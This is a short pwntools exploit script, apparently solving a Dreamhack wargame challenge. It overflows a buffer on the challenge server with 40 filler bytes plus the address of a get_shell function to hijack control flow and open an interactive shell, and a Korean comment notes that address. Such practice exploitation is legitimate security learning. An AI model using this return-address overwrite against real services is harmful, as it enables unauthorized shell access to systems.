#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 22994)

get_shell = 0x0804867b
dummy = b"A"

payload = dummy*40
payload += pwn.p32(get_shell)

p.sendline(payload)
p.interactive()

"""
get_shell 주소 : 0x0804867b
"""
